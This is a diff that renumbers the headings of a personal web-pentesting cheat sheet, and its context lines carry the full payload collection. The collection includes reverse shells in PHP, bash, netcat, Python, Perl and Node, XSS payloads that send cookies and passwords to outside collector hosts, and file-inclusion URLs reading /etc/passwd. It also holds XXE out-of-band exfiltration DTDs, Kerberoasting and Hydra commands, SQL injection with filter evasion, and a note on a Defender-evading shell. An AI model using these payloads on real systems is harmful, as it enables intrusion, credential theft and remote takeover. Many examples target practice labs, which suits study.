@@ -1,19 +1,19 @@
 
-# FILE INCLUSION
+# 1	FILE INCLUSION
 
-## LOCAL FILE INCLUSION
+## 1.1	LOCAL FILE INCLUSION
 
-### DIRECTORY TRAVERSAL
+### 1.1.1	DIRECTORY TRAVERSAL
 
 - Include `../` characters to trick parser into accessing directories above the indicated directory, possibly revealing sensitive information.
 
 `http://10.10.10.100/photoalbum/disaply.php?photo=../../../../../../etc/passwd`
-### PHP WRAPPERS
+### 1.1.2	PHP WRAPPERS
 
-#### Expect
+#### 1.1.2.1	Expect
 
 `http://10.10.10.100/photoalbum/disaply.php?photo=expect://ls`
-#### Data
+#### 1.1.2.2	Data
 
 - Inject the PHP code you want directly in the URL
 
@@ -21,7 +21,7 @@
 
 source: [2]
 
-#### Filter
+#### 1.1.2.3	Filter
 
 `http://10.102.3.45/description.php?page=php://filter/convert.base64-encode/resource=config.php`
 
@@ -29,15 +29,15 @@ source: [2]
 
 source: [2]
 
-## REMOTE FILE INCLUSION
+## 1.2	REMOTE FILE INCLUSION
 
-### HTTP Inclusion
+### 1.2.1	HTTP Inclusion
 
 `$ python -m SimpleHTTPServer 4444 http://10.102.8.127/description.php?page=http://10.102.5.106:4444/shell.php`
 
 - If http is blocked, try HTTP or other caps variations.
 
-### SMB Inclusion
+### 1.2.2	SMB Inclusion
 
 - Use when "allow_url_include=0" and http:// is blocked.
 
@@ -45,35 +45,35 @@ source: [2]
 
 source: [1]
 
-# CROSS SITE SCRIPTING
+# 2	CROSS SITE SCRIPTING
 
-## REFLECTED
+## 2.1	REFLECTED
 
 - Occurs when user inputs (like URL parameters) are reflected back onto the web page. Adversaries can inject script tags to run arbitrary code.
 
 `http://10.102.11.197/purchase?id=<script>alert("xss")</script>`
 
-### -
+### 2.1.1	-
 
 - Tip: check if URL parameter is reflected in the webpage. I.e. from Blake Jarvis, "web.k" reflected into "class" attribute. double-quotes not escaped, leading to xss.
 
 `es-pe/web.k"onpageshow=alert(1)%20y="`
 
-### -
+### 2.1.2	-
 
 - Tip: If a certain payload doesn't work, try multiple. PortSwigger lab rejected `<script>` tags but worked with `<img>` tag. [23]
 
-## STORED
+## 2.2	STORED
 
 - Occurs when user inputs are STORED (like blog comments) and reflected back onto the web page. Anyone visiting the blog will be victim.  
 
-## DOM-BASED
+## 2.3	DOM-BASED
 
 - The technique to avoid sending payload to the server hinges on the fact that URI fragments (i.e. part in URI after #) is not sent to server
 
 `somesite.com/page.html#default=<XSSinjection>`
 
-### -
+### 2.3.1	-
 
 - If input is reflected in href tag, try the following payload to achieve code execution [24]
 
@@ -81,75 +81,75 @@ source: [1]
 
 `https://0a76008f032e38dec037a4a3007c0075.web-security-academy.net/feedback?returnPath=javascript:alert(1)`
 
-### -
+### 2.3.2	-
 
 - This example includes XSS payload included after # in the URL. jQuery code on the webpage executes it.  
 
 `https://0a6c00cb04681a13c0f2cfe7000800d9.web-security-academy.net/#<img%20src=x%20onerror=alert(1)>`
 
-### -
+### 2.3.3	-
 
 - Check if user input is used in eval() anywhere.
 
-### -
+### 2.3.4	-
 
 - Check if user input is used in DOM statements such as "document.write" or "document.innerHTML"
 
   
 
-## EXFILTRATING A VICTIM'S COOKIES
+## 2.4	EXFILTRATING A VICTIM'S COOKIES
 
-### WEBSERVER REDIRECTION
+### 2.4.1	WEBSERVER REDIRECTION
 
 `$ python -m http.server 80`
 
 `<script>window.location.replace("http://10.102.4.49/"+document.cookie)</script>`         //NOT STEALTHY!!!
 
-### BURPSUITE COLLABORATOR CLIENT
+### 2.4.2	BURPSUITE COLLABORATOR CLIENT
 
 - Create Burp Collaborator link
 
-#### SIMPLE
+#### 2.4.2.1	SIMPLE
 
 `<script>window.location.replace("http://<BURP-COLLABORATOR-SUBDOMAIN>/"+document.cookie)</script>`
 
-#### ELEGANT
+#### 2.4.2.2	ELEGANT
 
 `<script>fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>`
 
-## EXFILTRATING PASSWORD
+## 2.5	EXFILTRATING PASSWORD
 
-### BURPSUITE COLLABORATOR CLIENT
+### 2.5.1	BURPSUITE COLLABORATOR CLIENT
 
-#### -
+#### 2.5.1.1	-
 
 `<input name=username id=username>`
 
 `<input type=password name=password onchange="if(this.value.length)fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">`
 
-### PRAETORIAN DNS
+### 2.5.2	PRAETORIAN DNS
 
 `<h1>Reauthenticate:</h1><input type=password onchange="fetch('http://'+this.value+'.dns.praetorianlabs.com')" placeholder="password">`
 
-## FILTER EVASION
+## 2.6	FILTER EVASION
 
 - Full list at https://kalilinuxtutorials.com/xss-payload-list/
 
-### -
+### 2.6.1	-
 
 `<BODY ONLOAD=alert('XSS')>`
 
-### IF CARETS ENCODED [26]
+### 2.6.2	IF CARETS ENCODED [26]
 
-#### -
+#### 2.6.2.1	-
 
 `"onpageshow="alert(1)`
 
-#### -
+#### 2.6.2.2	-
 
 `"onmouseover="alert(1)`
 
-### JSON BREAKOUT [28]
+### 2.6.3	JSON BREAKOUT [28]
 
 - This example only works if input is within eval()
 
@@ -163,15 +163,15 @@ source: [1]
 
 `https://0a2700a504f96ce0c1f96a4700e900dc.web-security-academy.net/?search=\"-alert(1)//`
 
-### JAVASCRIPT REPLACE FUNCTION
+### 2.6.4	JAVASCRIPT REPLACE FUNCTION
 
 - JavaScript replace() function only removes first instance of offending characters.
 
 `<><img src=x onerror=alert(1)>`
 
-### EXHAUSTIVE XSS CAPABILITY CHECK
+### 2.6.5	EXHAUSTIVE XSS CAPABILITY CHECK
 
-#### [30]
+#### 2.6.5.1	[30]
 
 - Use when WAF blocks many/most HTML tags and attributes. This technique will check if any vulnerable tags are available.
 - Burp Intruder
@@ -180,39 +180,39 @@ source: [1]
 - Then, check allowed attributes.
 - For example, `<body%20§§=1>`
 
-### HEX-ENCODING
+### 2.6.6	HEX-ENCODING
 
-#### EXAMPLE
+#### 2.6.6.1	EXAMPLE
 
 If '/' is blocked, try '\x2f'. Hex-encoding with '\x' delimiter.
 
-## XSS POLYGLOT
+## 2.7	XSS POLYGLOT
 
-### [25]
+### 2.7.1	[25]
 
 ```
 JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76->\
 ```
 
-### Praetorian destination
+### 2.7.2	Praetorian destination
 
 ```
 JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)("x2467")}//><Base/Href=//praetorian.com\76->\
 ```
 
-### ENCODED
+### 2.7.3	ENCODED
 
 ```
 JavaScript%3A%2F%2F%25250Aalert%3F.(1)%2F%2F*%27%2F*%5C%27%2F*%22%2F*%5C%22%2F*%60%2F*%5C%60%2F*%2526apos%3B)%2F*%3C!-%3E%3C%2FTitle%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%5C74k%3CK%2FcontentEditable%2FautoFocus%2FOnFocus%3D%2F*%24%7B%2F*%2F%3B%7B%2F**%2F(alert)(%22x2467%22)%7D%2F%2F%3E%3CBase%2FHref%3D%2F%2Fpraetorian.com%5C76-%3E%5C
 ```
 
-### Shortest
+### 2.7.4	Shortest
 
 `<K/contentEditable/autoFocus/OnFocus=(alert)("x2467")>`
 
-## CSRF THROUGH XSS
+## 2.8	CSRF THROUGH XSS
 
-### [29]
+### 2.8.1	[29]
 
 ```
 <script>
@@ -237,17 +237,17 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 
 - changeReq request imitates normal POST request, including URL and HTTP body.
 
-## XSS VIA CUSTOM TAG
+## 2.9	XSS VIA CUSTOM TAG
 
-### [32]
+### 2.9.1	[32]
 
-#### EXAMPLE PAYLOAD
+#### 2.9.1.1	EXAMPLE PAYLOAD
 
 `<xss id=x2467 onfocus=alert(document.cookie) tabindex=1>`
 
 `https://0a3b008003696505c0a44a0300ca00f2.web-security-academy.net/?search=%3Cxss+id%3D%22x2467%22+onfocus%3Dalert(1)+tabindex%3D1%3E#x2467`
 
-#### DESCRIPTION
+#### 2.9.1.2	DESCRIPTION
 
 - Custom tag is `<xss>`
 - Set custom id of "x2467". This will allow us to focus on the element later with #
@@ -255,11 +255,11 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 - Set tabindex attribute in order for element to be focusable [33]
 - In URL, focus on the new element with` #<id>`
 
-## XSS VIA CANONICAL LINK
+## 2.10	XSS VIA CANONICAL LINK
 
-### [34]
+### 2.10.1	[34]
 
-#### EXAMPLE PAYLOAD
+#### 2.10.1.1	EXAMPLE PAYLOAD
 
 `'accesskey='x'onclick='alert(1)`
 
@@ -267,34 +267,34 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 
 - Execute via CTRL+ALT+X
 
-# COMMAND LINE KUNG FU
+# 3	COMMAND LINE KUNG FU
 
-## COMMAND HISTORY
+## 3.1	COMMAND HISTORY
 
-### -
+### 3.1.1	-
 - Commands entered in terminal are tracked using HISTFILE environment variable and written to ~/.bashrc when user logs off.
-### -
+### 3.1.2	-
 - Prevent commands being recorded by prepending with a space. Alternatively, use 'set +o history' and 'set -o history'
 
-## SUDO
+## 3.2	SUDO
 
-### TIMEOUT
+### 3.2.1	TIMEOUT
 
 - By default, set to 5 or 15 minutes based on OS
 - Session timeouts tracked using file records. Often at `/run/sudo/ts/<USERNAME>`
 
-### Sessions
+### 3.2.2	Sessions
 
 - By default, sudo honors session segregation. You would have to authenticate for two separate windows.
 - tty_tickets flag controls this
 
-# DESERIALIZATION ATTACKS
+# 4	DESERIALIZATION ATTACKS
 
-## .NET
+## 4.1	.NET
 
-### DETECTION
+### 4.1.1	DETECTION
 
-#### SOURCE CODE SCAN [44]
+#### 4.1.1.1	SOURCE CODE SCAN [44]
 
 - The following terms are suspect
 	- TypeNameHandling
@@ -305,120 +305,120 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 
 `XmlSerializer(typeof(<TYPE>))`
 
-#### BLACK BOX [45]
+#### 4.1.1.2	BLACK BOX [45]
 
 - Search for the following b64 encoded prefixes
 	- AAEAAD = .NET BinaryFormatter
 	- FF01 = .NET ViewState
 
-# WEBSITE ENUMERATION
+# 5	WEBSITE ENUMERATION
 
-## BASICS
+## 5.1	BASICS
 
-### ROBOTS TXT FILE
+### 5.1.1	ROBOTS TXT FILE
 
 - Check http://example.com/robots.txt
 
-### ADMIN DIRECTORY
+### 5.1.2	ADMIN DIRECTORY
 
 - Check http://example.com/admin
 
-### HEADER INJECTION
+### 5.1.3	HEADER INJECTION
 
-#### REFERER
+#### 5.1.3.1	REFERER
 
 - Referer: http://127.0.0.1
 
-# BRUTE FORCING
+# 6	BRUTE FORCING
 
-## BASIC AUTH
+## 6.1	BASIC AUTH
 
-### HYDRA
+### 6.1.1	HYDRA
 
 `hydra -l <USERNAME> -P <PASSWORDLIST> <IP> -s <PORT> http-get "/<PATH>"`
 
-## SSH
+## 6.2	SSH
 
-### HYDRA
+### 6.2.1	HYDRA
 
 `hydra -l <USERNAME> -P <PASSWORDLIST> -s <PORT> ssh://<IP>`
 
-# KERBEROASTING [20]
+# 7	KERBEROASTING [20]
 
-## DESCRIPTION
+## 7.1	DESCRIPTION
 
 - Technique used to collect Kerberos tickets for service accounts that contain password hashes
 - Hashes can be cracked offline. Service accounts sometimes run with elevated privileges.
 
-## SERVICE PRINCIPAL NAMES (SPN)
+## 7.2	SERVICE PRINCIPAL NAMES (SPN)
 
 - Used to identify services on Windows
 - They must be associated with an account (usually a service account)
 - Any domain account including non-admin user can request tickets for these accounts
 
-## GET USER SPNs
+## 7.3	GET USER SPNs
 
 - PowerSploit. Invoke-Kerberoast
 - Empire
 
-### IMPACKET GetUserSPNs.py
+### 7.3.1	IMPACKET GetUserSPNs.py
 
 `python GetUserSPNs.py -dc-ip <IP OF DC> <DOMAIN>/<USERNAME>:<PASSWORD> -request`
 
-## CRACK HASH
+## 7.4	CRACK HASH
 
-### HASHCAT
+### 7.4.1	HASHCAT
 
 `hashcat -m 13100 -a 0 <HASHFILE> <WORDLISTFILE>`
 
-## EXPLOIT
+## 7.5	EXPLOIT
 
 - Use msfconsole psexec module to pwn the DC with new creds. Access as service account
 
-# REVERSE SHELLS [3][37][40]
+# 8	REVERSE SHELLS [3][37][40]
 
-## PHP
+## 8.1	PHP
 
-### -
+### 8.1.1	-
 
 `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'");?>`
 
-### -
+### 8.1.2	-
 
 `php -r '$sock=fsockopen("<LISTENER_IP>",<LISTENER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
-## NETCAT
+## 8.2	NETCAT
 
-### -
+### 8.2.1	-
 
 `nc -e /bin/sh <LISTENER_IP> <LISTENER_PORT>`
 
-### -
+### 8.2.2	-
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f`
 
-## BASH
+## 8.3	BASH
 
-### -
+### 8.3.1	-
 
 `bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1`
 
 
-## PYTHON
+## 8.4	PYTHON
 
-### -
+### 8.4.1	-
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-## PERL
+## 8.5	PERL
 
-### -
+### 8.5.1	-
 
 `perl -e 'use Socket;$i="<LISTENER_IP>";$p=<LISTENER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
-## NODEJS
+## 8.6	NODEJS
 
-### -
+### 8.6.1	-
 
 ```
 var net = require("net"), sh = require("child_process").exec("/bin/bash");
@@ -430,22 +430,22 @@ client.connect(<LISTENER_PORT>, "<LISTENER_IP>", function(){client.pipe(sh.stdin
 sh.stderr.pipe(client);});
 ```
 
-## NIM
+## 8.7	NIM
 
-### [47]
+### 8.7.1	[47]
 
 - see "rev_shell.nim"
 - A simple reverse shell written in Nim that bypasses Windows Defender detection.
 
   
 
-# CORS
+# 9	CORS
 
-## REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER
+## 9.1	REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER
 
-### DESCRIPTION
+### 9.1.1	DESCRIPTION
 
-### SAMPLE PAYLOAD
+### 9.1.2	SAMPLE PAYLOAD
 
 ```
 <script>
@@ -461,22 +461,22 @@ location='/log?key='+this.responseText; //Attacker exfiltration server
 </script>
 ```
 
-## TRUSTED NULL ORIGIN
+## 9.2	TRUSTED NULL ORIGIN
 
-### DESCRIPTION
+### 9.2.1	DESCRIPTION
 
 - If Origin: null is accepted origin, payload can be created within an iframe on attacker site, to emulate null origin.
 
-### SAMPLE PAYLOAD
+### 9.2.2	SAMPLE PAYLOAD
 
-## TRUSTED SUBDOMAINS [36]
+## 9.3	TRUSTED SUBDOMAINS [36]
 
-### DESCRIPTION
+### 9.3.1	DESCRIPTION
 
 - If http://test.com is accepted origin, check if http://evil.test.com is accepted origin.
 	- If subdomain has an XSS vulnerability, can exploit this to leak sensitive data
 
-### SAMPLE PAYLOAD
+### 9.3.2	SAMPLE PAYLOAD
 
 ```
 <script>
@@ -486,11 +486,11 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 </script>
 ```
 
-# CSRF
+# 10	CSRF
 
-## BASIC
+## 10.1	BASIC
 
-## CSRF WITH JSON PAYLOAD [48], [49]
+## 10.2	CSRF WITH JSON PAYLOAD [48], [49]
 
 - Problem: When submitting a JSON payload with Burp-generated PoC, it will end up looking like below, with an extra '=' character at the end. This is because it's trying to emulate a form parameter like "param1=value1".
 ```
@@ -509,24 +509,24 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 ```
 
 
-# OAUTH
+# 11	OAUTH
 
-## OVERVIEW
+## 11.1	OVERVIEW
 
-### ACTORS [34]
+### 11.1.1	ACTORS [34]
 
 - Client application: The website or web application that wants to access the user's data.
 - Resource owner: The user whose data the client application wants to access.
 - OAuth service provider: The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.
 
-## LACK OF STATE PARAMETER
+## 11.2	LACK OF STATE PARAMETER
 
-### DESCRIPTION [34]
+### 11.2.1	DESCRIPTION [34]
 
 - The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow.
 - This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application.
 
-### CSRF ATTACK
+### 11.2.2	CSRF ATTACK
 
 - If application does not have a state parameter
 
@@ -538,14 +538,14 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 
 - Victim's client application account will now be tied to attacker's OAuth service provider.
 
-## REDIRECT_URI TAMPERING
+## 11.3	REDIRECT_URI TAMPERING
 
-### DESCRIPTION [34]
+### 11.3.1	DESCRIPTION [34]
 
 - Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request.
 - An attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri
 
-### ACCOUNT HIJACKING
+### 11.3.2	ACCOUNT HIJACKING
 
 - Create a malicious page with iframe
 
@@ -555,9 +555,9 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 
 - Use this code to complete attacker OAuth signin
 
-## REDIRECT_URI TAMPERING WITH DIRECTORY TRAVERSAL AND OPEN REDIRECT [35]
+## 11.4	REDIRECT_URI TAMPERING WITH DIRECTORY TRAVERSAL AND OPEN REDIRECT [35]
 
-### DESCRIPTION
+### 11.4.1	DESCRIPTION
 
 - Application does not allow arbitrary redirect_uri in OAuth flow
 - However, application suffers from directory traversal in redirect_uri
@@ -587,32 +587,32 @@ window.location = '/?'+document.location.hash.substr(1)
 </script>
 ```
 
-# BYPASSING HTTP CLIENT-SIDE CONTROLS
+# 12	BYPASSING HTTP CLIENT-SIDE CONTROLS
 
-## HIDDEN FORM FIELDS
+## 12.1	HIDDEN FORM FIELDS
 
-## HTTP COOKIES
+## 12.2	HTTP COOKIES
 
 admin=true
 
-## URL PARAMETERS
+## 12.3	URL PARAMETERS
 
 http://www.derricksdoughnuts.com/apply_discount?discount_percent=10
 
-## REFERER HEADER
+## 12.4	REFERER HEADER
 
 - Developers will sometimes restrict access depending on the HTTP header information contained in a request. Try changing Referrer header.
 
-# HTTP REQUEST SMUGGLING
+# 13	HTTP REQUEST SMUGGLING
 
-## DESCRIPTION
+## 13.1	DESCRIPTION
 
 - The HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
 - If front-end and back-end servers interpret incoming requests differently, an attacker may be able to trick the servers to "smuggle" content that normally would be blocked. Or to tamper with next request.
 
-## EXPLOITS
+## 13.2	EXPLOITS
 
-### BASIC CL.TE
+### 13.2.1	BASIC CL.TE
 
 - First server interprets Content-Length. Second interprets Transfer-Encoding.
 - Create message with smuggled part at the end. Then, add newlines and 0 at beginning to trick TE server. Update Content-Length appropriately.
@@ -635,7 +635,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-### BASIC TE.CL
+### 13.2.2	BASIC TE.CL
 
 - First server interprets Transfer-Encoding, Second interprets Content-Length
 - Create a normal chunked message that will be smuggled. Then, craft Content-Length header to cut off before it begins. The below example cuts off a "8".
@@ -658,57 +658,57 @@ SMUGGLED
 0
 ```
 
-# DIRBUSTING
+# 14	DIRBUSTING
 
-## ADVANCED OPTIONS
+## 14.1	ADVANCED OPTIONS
 
-### HTTP OPTIONS
+### 14.1.1	HTTP OPTIONS
 
-#### CUSTOM HTTP HEADERS
+#### 14.1.1.1	CUSTOM HTTP HEADERS
 
-##### -
+##### 14.1.1.1.1	-
 
 - X-Forwarded-For set to 127.0.0.1 to reveal web pages only accessible to localhost
 
-##### -
+##### 14.1.1.1.2	-
 
 - Can add Basic auth header
 
-#### HTTP USER AGENT
+#### 14.1.1.2	HTTP USER AGENT
 
 - Change to an inconspicuous user agent
 
-### SCAN OPTIONS
+### 14.1.2	SCAN OPTIONS
 
-#### -
+#### 14.1.2.1	-
 
 - Limit number of requests per second to increase stealth
 
-## FEROXBUSTER
+## 14.2	FEROXBUSTER
 
 - Much better than any other dir brute forcing tool. Supports multiple http verbs AND recursion.
 
-### EXAMPLE
+### 14.2.1	EXAMPLE
 
 ```
 feroxbuster -u "http://apigateway:8000" -m GET,POST -w /usr/share/wordlists/dirb/small.txt -s 200,400,401,403,500 --force-recursion -d 2
 ```
 
-## GOBUSTER
+## 14.3	GOBUSTER
 
-### EXAMPLE
+### 14.3.1	EXAMPLE
 
 ```
 gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b 301
 ```
 
-# XXE INJECTION
+# 15	XXE INJECTION
 
-## BASICS
+## 15.1	BASICS
 
-### EXPLOITING XXE TO RETRIEVE FILES [12,13]
+### 15.1.1	EXPLOITING XXE TO RETRIEVE FILES [12,13]
 
-#### BASIC FILE RETRIEVAL
+#### 15.1.1.1	BASIC FILE RETRIEVAL
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -716,33 +716,33 @@ gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
-#### BASE64 FILE RETRIEVAL [17]
+#### 15.1.1.2	BASE64 FILE RETRIEVAL [17]
 
-##### -
+##### 15.1.1.2.1	-
 
 ```
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 ```
 
-##### -
+##### 15.1.1.2.2	-
 
 ```
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" > ]>
 ```
 
-### SSRF ATTACKS [12]
+### 15.1.2	SSRF ATTACKS [12]
 
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
 
-### XXE to RCE WITH PHP [16]
+### 15.1.3	XXE to RCE WITH PHP [16]
 
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
 ```
 
-### BILLION LAUGHS ATTACK
+### 15.1.4	BILLION LAUGHS ATTACK
 
 ```
 <!DOCTYPE dos [
@@ -758,20 +758,20 @@ gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b
 <leave><employerId>&dos9;</employerId></leave>
 ```
 
-## BLIND XXE
+## 15.2	BLIND XXE
 
-### DETECTION
+### 15.2.1	DETECTION
 
 - Induce SSRF via SimpleHTTPServer, check if traffic occurred.
 
-### EXPLOITING BLIND XXE TO EXFILTRATE DATA OUT-OF-BAND [14]
+### 15.2.2	EXPLOITING BLIND XXE TO EXFILTRATE DATA OUT-OF-BAND [14]
 
 - Host malicious DTD (Document Type Definition) on controlled system
 - Invoke external malicious DTD from within the in-band XXE payload
 
-#### Option 1 [14]
+#### 15.2.2.1	Option 1 [14]
 
-##### ATTACKER SERVER
+##### 15.2.2.1.1	ATTACKER SERVER
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -780,22 +780,22 @@ gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b
 %exfiltrate;
 ```
 
-##### XXE PAYLOAD
+##### 15.2.2.1.2	XXE PAYLOAD
 
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
 
-#### Option 2 [15]
+#### 15.2.2.2	Option 2 [15]
 
-##### ATTACKER SERVER
+##### 15.2.2.2.1	ATTACKER SERVER
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
 ```
 
-##### XXE PAYLOAD
+##### 15.2.2.2.2	XXE PAYLOAD
 
 ```
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd"> %xxe; %ext; ]>
@@ -806,27 +806,27 @@ gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b
 
   
 
-# SQL INJECTION
+# 16	SQL INJECTION
 
-## BASICS
+## 16.1	BASICS
 
-### BASIC INJECTION
+### 16.1.1	BASIC INJECTION
 
 `' OR 1=1 -- `
 
 - Note the space at the end. The `--` is for commenting out the rest of the legitimate line.
 
-### DATABASE ENUMERATION
+### 16.1.2	DATABASE ENUMERATION
 
-#### ENUMERATE DATABASES
+#### 16.1.2.1	ENUMERATE DATABASES
 
-##### -
+##### 16.1.2.1.1	-
 
 ```
 ' UNION SELECT schema_name, NULL, NULL,... FROM information_schema.schemata --
 ```
 
-##### -
+##### 16.1.2.1.2	-
 
 ```
 ' UNION SELECT DATABASE(),2,...N --
@@ -834,7 +834,7 @@ gobuster dir -u http://192.168.148.247 -w /usr/share/wordlists/dirb/small.txt -b
 
 - Enumerates only current database
 
-#### ENUMERATE NUMBER OF COLUMNS IN CURRENT SELECT STATEMENT
+#### 16.1.2.2	ENUMERATE NUMBER OF COLUMNS IN CURRENT SELECT STATEMENT
 
 ```
 james' ORDER BY <N> --
@@ -842,7 +842,7 @@ james' ORDER BY <N> --
 
 - Increment `<N>` until it returns an invalid response.
 
-#### ENUMERATE VULNERABLE COLUMNS
+#### 16.1.2.3	ENUMERATE VULNERABLE COLUMNS
 
 ```
 james' UNION SELECT 1,..,N --
@@ -850,35 +850,35 @@ james' UNION SELECT 1,..,N --
 
 Returns vulnerable columns. Not sure how this works exactly?
 
-#### ENUMERATE TABLES
+#### 16.1.2.4	ENUMERATE TABLES
 
-##### -
+##### 16.1.2.4.1	-
 
 ```
 james' UNION SELECT 1,..,N-1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() --
 ```
 
-##### -
+##### 16.1.2.4.2	-
 
 ```
 ' UNION SELECT table_name, NUll, NUll,... FROM information_schema.tables WHERE table_schema='<DATABASE NAME>' --
 ```
 
-#### ENUMERATE COLUMNS
+#### 16.1.2.5	ENUMERATE COLUMNS
 
-##### -
+##### 16.1.2.5.1	-
 
 ```
 james' UNION SELECT 1,...,N-1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='<TABLE>' --
 ```
 
-##### -
+##### 16.1.2.5.2	-
 
 ```
 ' UNION SELECT column_name, NULL, NULL,... FROM information_schema.columns WHERE table_name='<TABLE NAME>' --
 ```
 
-#### EXFILTRATING DATA
+#### 16.1.2.6	EXFILTRATING DATA
 
 ```
 ' UNION SELECT <COLUMN>, NULL, NULL, NULL, NULL,..., FROM <TABLE> WHERE id=1 --
@@ -888,15 +888,15 @@ james' UNION SELECT 1,...,N-1,GROUP_CONCAT(column_name) FROM information_schema.
 
 - Each column must also have the same data type (using NULL can overcome this)
 
-### FILTER EVASION
+### 16.1.3	FILTER EVASION
 
-#### ABNORMAL CAPITALIZATION
+#### 16.1.3.1	ABNORMAL CAPITALIZATION
 
 ```
 UnION, SeLECT
 ```
 
-#### URL ENCODING
+#### 16.1.3.2	URL ENCODING
 
 ```
 %55 equals 'U'
@@ -906,13 +906,13 @@ UnION, SeLECT
 %55NION, %53ELECT
 ```
 
-#### MULTI-LINE COMMENTS
+#### 16.1.3.3	MULTI-LINE COMMENTS
 
 ```
 UN/**/ION, SE/**/LECT
 ```
 
-#### PLUS+ CONCATENATION
+#### 16.1.3.4	PLUS+ CONCATENATION
 
 - '+' can be used to build an injection query without the use of quotes
 	- not verified
@@ -921,7 +921,7 @@ UN/**/ION, SE/**/LECT
 UNION+SELECT+
 ```
 
-#### POUND# BYPASS
+#### 16.1.3.5	POUND# BYPASS
 
 - Abuses inline comment system within MySQL
 	- not verified
@@ -931,7 +931,7 @@ UNION+SELECT+
 ```
 
 
-#### REVERSE FUNCTION
+#### 16.1.3.6	REVERSE FUNCTION
 
 - not verified
 
@@ -939,20 +939,20 @@ UNION+SELECT+
 REVERSE('NOINU') REVERSE('TCELES')
 ```
 
-#### HEX ENCODING
+#### 16.1.3.7	HEX ENCODING
 
 - Useful when ' character is blocked
 
 `WHERE username=0x626f62` is analagous to `WHERE username='bob'`
 
 
-#### CONCAT CHAR
+#### 16.1.3.8	CONCAT CHAR
 
 - Useful when ' character is blocked
 
 `WHERE username=CONCAT(CHAR(77),CHAR(76),CHAR(75))` is analagous to `WHERE username='MLK'`
 
-#### IF SPACE CHARACTER BLOCKED
+#### 16.1.3.9	IF SPACE CHARACTER BLOCKED
 
 - Can use multi-line comments
 
@@ -960,11 +960,11 @@ REVERSE('NOINU') REVERSE('TCELES')
 <VALIIDVALUE>')/**/OR/**/1=1%23
 ```
 
-## BOOLEAN-BASED BLIND [6,7]
+## 16.2	BOOLEAN-BASED BLIND [6,7]
 
-### PROOF OF CONCEPT
+### 16.2.1	PROOF OF CONCEPT
 
-#### -
+#### 16.2.1.1	-
 
 ```
